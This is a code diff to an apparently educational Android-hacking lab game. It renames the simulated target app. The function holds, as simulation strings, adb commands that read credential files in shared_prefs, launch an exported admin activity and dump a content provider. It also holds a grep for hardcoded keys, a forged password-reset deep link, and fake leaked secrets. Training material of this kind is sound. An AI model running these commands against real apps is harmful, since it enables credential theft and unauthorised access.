@@ -8,18 +8,18 @@ function submitAndroid(level, payload) {
   // Realistic request simulation
   const requests = {
     1: `adb shell
-cd /data/data/com.khansploit.app/shared_prefs/
+cd /data/data/com.VulnXploit.app/shared_prefs/
 cat user_data.xml`,
-    2: `adb shell am start -n com.khansploit.app/.AdminActivity
+    2: `adb shell am start -n com.VulnXploit.app/.AdminActivity
 # or
-adb shell content query --uri content://com.khansploit.provider/users`,
+adb shell content query --uri content://com.VulnXploit.provider/users`,
     3: `# Traffic intercepted
-GET http://api.khansploit.lab/v1/user HTTP/1.1
-Host: api.khansploit.lab`,
+GET http://api.VulnXploit.lab/v1/user HTTP/1.1
+Host: api.VulnXploit.lab`,
     4: `# APK decompiled with jadx / apktool
 grep -r "AIza\\|sk_live\\|api_key\\|secret" .`,
     5: `adb shell am start -a android.intent.action.VIEW \\
-  -d "khansploit://reset?user=admin&token=evil"`,
+  -d "VulnXploit://reset?user=admin&token=evil"`,
   };
 
   const successResponses = {
@@ -29,7 +29,7 @@ grep -r "AIza\\|sk_live\\|api_key\\|secret" .`,
   <string name="api_key">sk_live_abc123xyz</string>
   <string name="token">eyJhbGciOiJIUzI1NiIs...</string>
 </map>`,
-    2: `Starting: Intent { cmp=com.khansploit.app/.AdminActivity }
+    2: `Starting: Intent { cmp=com.VulnXploit.app/.AdminActivity }
 Status: ok
 
 Admin panel loaded successfully.
@@ -52,7 +52,7 @@ JWT_SECRET = "super_jwt_secret_key"
 
 Hardcoded secrets extracted.`,
     5: `Deep link handled:
-Scheme: khansploit
+Scheme: VulnXploit
 Host: reset
 Params: user=admin&token=evil
 
